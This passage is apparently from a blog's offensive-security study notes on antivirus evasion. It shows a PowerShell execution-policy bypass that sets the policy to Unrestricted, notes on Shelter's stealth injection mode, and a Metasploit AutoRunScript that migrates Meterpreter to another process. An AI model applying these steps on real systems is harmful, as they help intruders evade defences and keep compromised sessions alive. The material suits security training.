<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec\Desktop&gt; powershell .\av_test.ps1</span><br><span class="line">.\av_test.ps1 : File C:\Users\offsec\Desktop\av_test.ps1 cannot be loaded because</span><br><span class="line">running scripts is disabled on this</span><br><span class="line">system. For more information, see about_Execution_Policies at</span><br><span class="line">http:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ .\av_test.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~</span><br><span class="line">+ CategoryInfo : SecurityError: (:) [], PSSecurityException</span><br><span class="line">+ FullyQualifiedErrorId : UnauthorizedAccess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\offsec\Desktop&gt; powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Undefined</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope</span><br><span class="line">CurrentUser</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Unrestricted</span><br></pre></td></tr></table></figure>

<h1 id="Shelter"><a href="#Shelter" class="headerlink" title="Shelter"></a>Shelter</h1><p>stealth mode: restore the execution of original flow after finish the injected code  </p>
<p>Session died after original code exit </p>
<p>we can set up an AutoRunScript to migrate our Meterpreter to a separate process immediately after session creation</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>